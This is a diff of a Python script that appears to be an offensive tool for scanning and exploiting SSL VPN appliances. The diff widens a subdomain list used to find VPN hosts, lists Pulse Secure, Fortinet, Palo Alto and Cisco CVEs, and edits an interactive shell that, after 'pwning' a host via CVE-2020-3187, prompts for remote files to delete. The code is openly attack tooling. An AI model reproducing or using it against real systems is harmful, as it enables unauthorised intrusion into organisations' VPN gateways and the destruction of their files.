@@ -12,12 +12,10 @@ cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381',
 	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510',
 	  'CVE-2019-11542', 'CVE-2019-11540', 'CVE-2020-3187']
 # Updating this list ...
-vpnsub = ['vpn', 'covpn', 'tcovpn',
-          'panvpn', 'vpn-blr', 'vpn-blr1',
-          'vpn-west', 'vpn-east', 'vpn-sin',
-          'vpn-cai', 'westvpn', 'eastvpn',
-          'myvpn', 'privatevpn', 'pulsevpn',
-          'palovpn']
+vpnsub = ['vpn', 'covpn', 'tcovpn', 'panvpn', 'vpn-blr', 'vpn-blr1',
+          'vpn-west', 'vpn-east', 'vpn-sin', 'vpn-cai', 'westvpn',
+	  'eastvpn', 'myvpn', 'privatevpn', 'pulsevpn', 'palovpn',
+	  'vpn-portal', 'vpn1', 'vpn2', 'vpn3', 'vpn4', 'vpn5']
 red = '\033[1;31m'
 white = '\033[1;m'
 blue = '\033[1;34m'
@@ -62,7 +60,7 @@ if not len(host) and lst == False:
     quit()
     
 def printable_char(s):
-	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
+   return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
 
 def printable(b):
     if printable_char(b):
@@ -80,9 +78,9 @@ def cve_2020_3187(host, port):
         print('Pwned the DoS shell of %s' % host)
         print('')
         print('DoS shell CVE-2020-3187')
-        print('(!) Enter files you want to DoS to delete')
+        print('(!) Enter files you want to delete')
         while 1:
-            data = input('dos> ')
+            data = input('delete> ')
             if data.replace(' ', '') in ['exit', 'quit']:
                 break
             if data[0] != '/':
@@ -262,8 +260,8 @@ def scan(host):
     for sub in vpnsub:
         url = 'https://%s.%s' % (sub, host)
         try:
-            r = requests.get(url, verify=False, timeout=2.2)
-            print('Found a SSL VPN service: %s%s%s' % (red, url.replace('https://', ''), white))
+            r = requests.get(url, verify=False, timeout=4)
+            print('Found a VPN host: %s%s%s' % (red, url.replace('https://', ''), white))
             found = True
         except:
             pass
